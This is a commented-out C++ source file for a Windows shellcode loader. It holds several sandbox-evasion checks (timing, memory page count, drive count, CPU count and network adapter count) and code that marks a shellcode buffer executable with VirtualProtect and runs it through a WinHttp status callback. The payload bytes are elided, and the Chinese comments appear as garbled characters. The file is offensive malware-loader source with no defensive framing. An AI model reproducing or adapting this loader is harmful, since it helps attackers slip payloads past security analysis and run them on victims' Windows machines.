//#include<Windows.h>
//#include<winhttp.h>
//#include <chrono>
//#include <thread>
//#include <iostream>
//#include <Winsock2.h>
//#include <iphlpapi.h>
//using namespace std;
//#pragma comment(lib,"Winhttp.lib")
//#pragma comment(lib, "iphlpapi.lib")
//
////unsigned char lpAddress[] = "\xfc...";
//
////bool detect_sandbox() {     //���ʱ������
////    bool is_sandbox = false;
////    auto start_time = chrono::high_resolution_clock::now();
////
////    this_thread::sleep_for(chrono::milliseconds(100));
////
////    auto end_time = chrono::high_resolution_clock::now();
////    auto elapsed_time = chrono::duration_cast<chrono::milliseconds>(end_time - start_time);
////
////    if (elapsed_time.count() < 100) {
////        is_sandbox = true;
////    }
////
////    return is_sandbox;
////}
//
////int GetNumPages() {
////    // ��ȡϵͳҳ���ļ���С��Ϣ
////    MEMORYSTATUSEX statex;
////    statex.dwLength = sizeof(statex);
////    if (!GlobalMemoryStatusEx(&statex)) {
////        cout << "Failed to get system memory status." << endl;
////        return 1;
////    }
////
////    SYSTEM_INFO systemInfo;
////    GetSystemInfo(&systemInfo);
////    return statex.ullTotalPageFile / systemInfo.dwPageSize;
////}
//
////int getnumdrives() {
////    dword drives = getlogicaldrives();
////    int numdrives = 0;
////    for (char i = 0; i < 26; i++) {
////        if (drives & (1 << i)) {
////            char path[4];
////            sprintf_s(path, "%c:\\", 'a' + i);
////            uint type = getdrivetypea(path);
////            if (type == drive_fixed || type == drive_removable) {
////                numdrives++;
////            }
////        }
////    }
////    return numdrives;
////}
//
////int GetNumAdapters() {
////    DWORD dwSize = 0;
////    GetAdaptersAddresses(AF_UNSPEC, GAA_FLAG_INCLUDE_PREFIX, NULL, NULL, &dwSize);
////    PIP_ADAPTER_ADDRESSES pAddresses = (PIP_ADAPTER_ADDRESSES) new BYTE[dwSize];
////    GetAdaptersAddresses(AF_UNSPEC, GAA_FLAG_INCLUDE_PREFIX, NULL, pAddresses, &dwSize);
////    int numAdapters = 0;
////    PIP_ADAPTER_ADDRESSES pCurrAddresses = pAddresses;
////    while (pCurrAddresses) {
////        if (pCurrAddresses->OperStatus == IfOperStatusUp) {
////            numAdapters++;
////        }
////        pCurrAddresses = pCurrAddresses->Next;
////    }
////    return numAdapters;
////}
//int main() {
//
//    //if (detect_sandbox()) {     //���ʱ������
//    //    cout << "This program may be running in a sandbox!" << endl;
//    //}
//    //else {
//    //    cout << "This program is not running in a sandbox." << endl;
//    //}
//
//    //int numPages = GetNumPages();
//    //cout << numPages << endl;
//    //if (numPages < 4000000) {         //����ڴ�ҳ����
//    //    cout << "�ڴ�ҳС������ֵ�����ܴ������������" << endl;
//    //    return 1;
//    //}
//
//    //int numDrives = GetNumDrives();
//    //cout << numDrives << endl;         //���Ӳ������
//    //if (numDrives < 2) {
//    //    cout << "Ӳ������С������ֵ�����ܴ������������" << endl;
//    //    return 1;
//    //}
//
//    //SYSTEM_INFO systemInfo;
//    //GetSystemInfo(&systemInfo);
//    //cout << systemInfo.dwNumberOfProcessors << endl;
//    //if (systemInfo.dwNumberOfProcessors <= 4) {            //���CPU����
//    //    cout << "CPU����С������ֵ�����ܴ������������" << endl;
//    //    return 1;
//    //}
//
//    //int numAdapters = GetNumAdapters();
//    //cout << numAdapters << endl;
//    //if (numAdapters < 2) {                                      //�����������������
//    //    cout << "��������������С������ֵ�����ܴ������������" << endl;
//    //    return 1;
//    //}
//
//
//	//DWORD lpflOldProtect;
//	//VirtualProtect(lpAddress, sizeof lpAddress / sizeof lpAddress[0], PAGE_EXECUTE_READWRITE, &lpflOldProtect);
//	//HINTERNET hSession = WinHttpOpen(L"User Agent", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
//	//WINHTTP_STATUS_CALLBACK callback = WinHttpSetStatusCallback(hSession, (WINHTTP_STATUS_CALLBACK)&lpAddress, WINHTTP_CALLBACK_FLAG_HANDLES, 0);
//	//WinHttpCloseHandle(hSession);
//	//return 0;
//}